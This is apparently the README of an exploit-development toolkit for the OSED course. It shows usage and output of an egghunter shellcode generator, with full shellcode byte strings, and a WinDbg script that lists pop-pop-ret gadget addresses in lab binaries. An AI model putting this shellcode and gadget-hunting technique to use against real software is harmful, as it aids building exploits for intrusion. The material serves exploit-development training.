# osed-scripts
bespoke tooling for offensive security's Windows Usermode Exploit Dev course (OSED)

## Standalone Scripts

### egghunter.py

requires [keystone-engine](https://github.com/keystone-engine/keystone)

 

```
usage: egghunter.py [-h] [-t TAG] [-b BAD_CHARS [BAD_CHARS ...]]

Creates an egghunter compatible with the OSED lab VM

optional arguments:
  -h, --help            show this help message and exit
  -t TAG, --tag TAG     tag for which the egghunter will search (default: c0d3)
  -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
                        space separated list of bad chars to check for in final egghunter (default: 00)
```                        

generate default egghunter
```
./egghunter.py 
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x63\x30\x64\x33\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
egghunter created:
  len: 35 bytes
  tag: c0d3c0d3
```

generate egghunter with `w00tw00t` tag
```
./egghunter.py --tag w00t
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
egghunter created:
  len: 35 bytes
  tag: w00tw00t
```

generate egghunter while checking for bad characters (does not alter the shellcode, that's to be done manually)
```
./egghunter.py -b 00 0a 25 26 3d
egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x63\x30\x64\x33\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
egghunter created:
  len: 35 bytes
  tag: c0d3c0d3
```

## WinDbg Scripts

all windbg scripts require `pykd`

run `.load pykd` then `!py c:\path\to\this\repo\script.py` 

### find-ppr.py

Search for `pop r32; pop r32; ret` instructions by module name

```
!py find-ppr.py libspp diskpls

[+] diskpls::0x004313ad: pop ecx; pop ecx; ret
[+] diskpls::0x004313e3: pop ecx; pop ecx; ret
[+] diskpls::0x00417af6: pop ebx; pop ecx; ret
...
[+] libspp::0x1008a538: pop ebx; pop ecx; ret
[+] libspp::0x1008ae39: pop ebx; pop ecx; ret
[+] libspp::0x1008aebf: pop ebx; pop ecx; ret
...
```
